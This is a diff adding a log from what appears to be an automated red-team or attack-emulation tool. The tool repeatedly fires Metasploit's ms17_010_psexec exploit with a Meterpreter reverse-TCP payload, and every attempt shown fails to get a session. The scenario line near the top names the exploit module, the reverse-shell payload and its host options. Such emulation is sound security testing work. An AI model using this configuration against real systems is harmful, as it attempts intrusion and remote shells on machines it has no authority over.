@@ -1,0 +1,98 @@
+2020-06-01 21:48:55,179- session-for-5ed53181051e140dbc0be379 - INFO - Property Not Found
+2020-06-01 21:49:06,052- session-for-5ed53181051e140dbc0be379 - INFO - ....................Parsing Scenario....................
+2020-06-01 21:49:06,053- session-for-5ed53181051e140dbc0be379 - INFO - [{'TA01_T1190_P1': {'name': 'ms17_010_psexec', 'tactic': 'Initial_Access', 'try_count': 3, 'spawn_seperate_session': True, 'tool': 'metasploit', 'exploit': 'windows/smb/ms17_010_psexec', 'payload': 'windows/meterpreter/reverse_tcp', 'options': {'LHOST': 'LHOST_$ref', 'LPORT': 'LPORT_$ref', 'RHOSTS': 'RHOSTS_$ref'}}}]
+2020-06-01 21:49:06,053- session-for-5ed53181051e140dbc0be379 - INFO - *****************************Check tools status*****************************
+2020-06-01 21:49:06,054- session-for-5ed53181051e140dbc0be379 - INFO - ['metasploit']
+2020-06-01 21:49:06,054- session-for-5ed53181051e140dbc0be379 - INFO - msfconsole = [32mTrue[0m
+2020-06-01 21:49:06,054- session-for-5ed53181051e140dbc0be379 - INFO - ************************Updating Session Tactics**********************
+2020-06-01 21:49:06,057- session-for-5ed53181051e140dbc0be379 - INFO - Tacics list has been appended in list has been appended in evaluation
+2020-06-01 21:49:06,060- session-for-5ed53181051e140dbc0be379 - INFO - No Exceptions Found
+2020-06-01 21:49:06,143- session-for-5ed53181051e140dbc0be379 - INFO - post not needed
+2020-06-01 21:49:06,163- session-for-5ed53181051e140dbc0be379 - INFO - exploit['LHOST'] not needed...
+2020-06-01 21:49:06,163- session-for-5ed53181051e140dbc0be379 - INFO - exploit['LPORT'] not needed...
+2020-06-01 21:49:06,163- session-for-5ed53181051e140dbc0be379 - INFO - option not found in payloads
+2020-06-01 21:49:06,184- session-for-5ed53181051e140dbc0be379 - INFO - cid: 20
+2020-06-01 21:49:06,185- session-for-5ed53181051e140dbc0be379 - INFO - ....................Executing Exploit......................................
+2020-06-01 21:49:07,206- session-for-5ed53181051e140dbc0be379 - INFO - {'job_id': 26, 'uuid': '2yysgovk'}
+2020-06-01 21:49:07,211- session-for-5ed53181051e140dbc0be379 - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 21:49:10,224- session-for-5ed53181051e140dbc0be379 - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 21:49:13,237- session-for-5ed53181051e140dbc0be379 - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 21:49:16,257- session-for-5ed53181051e140dbc0be379 - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 21:49:19,270- session-for-5ed53181051e140dbc0be379 - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 21:49:22,271- session-for-5ed53181051e140dbc0be379 - INFO - .........Executing Exploit again..........
+
+2020-06-01 21:49:22,271- session-for-5ed53181051e140dbc0be379 - INFO - ....................Executing Exploit......................................
+2020-06-01 21:49:23,596- session-for-5ed53181051e140dbc0be379 - INFO - {'job_id': 27, 'uuid': 'mjoliv3x'}
+2020-06-01 21:49:23,602- session-for-5ed53181051e140dbc0be379 - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 21:49:26,615- session-for-5ed53181051e140dbc0be379 - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 21:49:29,640- session-for-5ed53181051e140dbc0be379 - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 21:49:32,649- session-for-5ed53181051e140dbc0be379 - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 21:49:35,662- session-for-5ed53181051e140dbc0be379 - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 21:49:38,665- session-for-5ed53181051e140dbc0be379 - INFO - .........Executing Exploit again..........
+
+2020-06-01 21:49:38,665- session-for-5ed53181051e140dbc0be379 - INFO - ....................Executing Exploit......................................
+2020-06-01 21:49:39,652- session-for-5ed53181051e140dbc0be379 - INFO - {'job_id': 28, 'uuid': 'cfrmuylu'}
+2020-06-01 21:49:39,658- session-for-5ed53181051e140dbc0be379 - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 21:49:42,669- session-for-5ed53181051e140dbc0be379 - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 21:49:45,682- session-for-5ed53181051e140dbc0be379 - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 21:49:48,695- session-for-5ed53181051e140dbc0be379 - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 21:49:51,708- session-for-5ed53181051e140dbc0be379 - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 21:49:54,712- session-for-5ed53181051e140dbc0be379 - INFO - .........Executing Exploit again..........
+
+2020-06-01 21:49:54,712- session-for-5ed53181051e140dbc0be379 - INFO - ....................Executing Exploit......................................
+2020-06-01 21:49:55,697- session-for-5ed53181051e140dbc0be379 - INFO - {'job_id': 29, 'uuid': 'uwc8l0fw'}
+2020-06-01 21:49:55,704- session-for-5ed53181051e140dbc0be379 - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 21:49:58,717- session-for-5ed53181051e140dbc0be379 - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 21:50:01,729- session-for-5ed53181051e140dbc0be379 - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 21:50:04,740- session-for-5ed53181051e140dbc0be379 - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 21:50:07,752- session-for-5ed53181051e140dbc0be379 - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 21:50:10,756- session-for-5ed53181051e140dbc0be379 - INFO - .........Executing Exploit again..........
+
+2020-06-01 21:50:10,756- session-for-5ed53181051e140dbc0be379 - INFO - ....................Executing Exploit......................................
+2020-06-01 21:50:11,745- session-for-5ed53181051e140dbc0be379 - INFO - {'job_id': 30, 'uuid': 'nua0dklw'}
+2020-06-01 21:50:11,751- session-for-5ed53181051e140dbc0be379 - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 21:50:14,765- session-for-5ed53181051e140dbc0be379 - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 21:50:17,789- session-for-5ed53181051e140dbc0be379 - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 21:50:20,801- session-for-5ed53181051e140dbc0be379 - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 21:50:23,814- session-for-5ed53181051e140dbc0be379 - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 21:50:26,815- session-for-5ed53181051e140dbc0be379 - INFO - .........Executing Exploit again..........
+
+2020-06-01 21:50:26,815- session-for-5ed53181051e140dbc0be379 - INFO - ....................Executing Exploit......................................
+2020-06-01 21:50:27,818- session-for-5ed53181051e140dbc0be379 - INFO - {'job_id': 31, 'uuid': 'ofmmi8z7'}
+2020-06-01 21:50:27,825- session-for-5ed53181051e140dbc0be379 - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 21:50:30,854- session-for-5ed53181051e140dbc0be379 - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 21:50:33,880- session-for-5ed53181051e140dbc0be379 - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 21:50:36,906- session-for-5ed53181051e140dbc0be379 - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 21:50:39,919- session-for-5ed53181051e140dbc0be379 - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 21:50:42,922- session-for-5ed53181051e140dbc0be379 - INFO - .........Executing Exploit again..........
+
+2020-06-01 21:50:42,922- session-for-5ed53181051e140dbc0be379 - CRITICAL - Exception Occured somewhere!!
+2020-06-01 21:50:42,923- session-for-5ed53181051e140dbc0be379 - INFO - Metasploit session took too long to obtain
+2020-06-01 21:50:42,923- session-for-5ed53181051e140dbc0be379 - INFO - ....................Going 1 step back........................
+2020-06-01 21:50:42,936- session-for-5ed53181051e140dbc0be379 - INFO - No Exceptions Found
+2020-06-01 21:50:43,014- session-for-5ed53181051e140dbc0be379 - INFO - post not needed
+2020-06-01 21:50:43,032- session-for-5ed53181051e140dbc0be379 - INFO - exploit['LHOST'] not needed...
+2020-06-01 21:50:43,032- session-for-5ed53181051e140dbc0be379 - INFO - exploit['LPORT'] not needed...
+2020-06-01 21:50:43,033- session-for-5ed53181051e140dbc0be379 - INFO - option not found in payloads
+2020-06-01 21:50:43,051- session-for-5ed53181051e140dbc0be379 - INFO - cid: 21
+2020-06-01 21:50:43,052- session-for-5ed53181051e140dbc0be379 - INFO - ....................Executing Exploit......................................
+2020-06-01 21:50:44,133- session-for-5ed53181051e140dbc0be379 - INFO - {'job_id': 32, 'uuid': '5ehmejxn'}
+2020-06-01 21:50:44,140- session-for-5ed53181051e140dbc0be379 - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 21:50:47,153- session-for-5ed53181051e140dbc0be379 - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 21:50:50,179- session-for-5ed53181051e140dbc0be379 - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 21:50:53,207- session-for-5ed53181051e140dbc0be379 - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 21:50:56,231- session-for-5ed53181051e140dbc0be379 - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 21:50:59,235- session-for-5ed53181051e140dbc0be379 - INFO - .........Executing Exploit again..........
+
+2020-06-01 21:50:59,235- session-for-5ed53181051e140dbc0be379 - INFO - ....................Executing Exploit......................................
+2020-06-01 21:51:00,433- session-for-5ed53181051e140dbc0be379 - INFO - {'job_id': 33, 'uuid': 'gq6muozi'}
+2020-06-01 21:51:00,439- session-for-5ed53181051e140dbc0be379 - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 21:51:03,465- session-for-5ed53181051e140dbc0be379 - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 21:51:06,490- session-for-5ed53181051e140dbc0be379 - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 21:51:09,503- session-for-5ed53181051e140dbc0be379 - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 21:51:12,515- session-for-5ed53181051e140dbc0be379 - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 21:51:15,518- session-for-5ed53181051e140dbc0be379 - INFO - .........Executing Exploit again..........
+
+2020-06-01 21:51:15,518- session-for-5ed53181051e140dbc0be379 - INFO - ....................Executing Exploit......................................
+2020-06-01 21:51:16,703- session-for-5ed53181051e140dbc0be379 - INFO - {'job_id': 34, 'uuid': 'd4usqmcy'}
+2020-06-01 21:51:16,709- session-for-5ed53181051e140dbc0be379 - INFO - Meterpreter Sessions list empty: {}
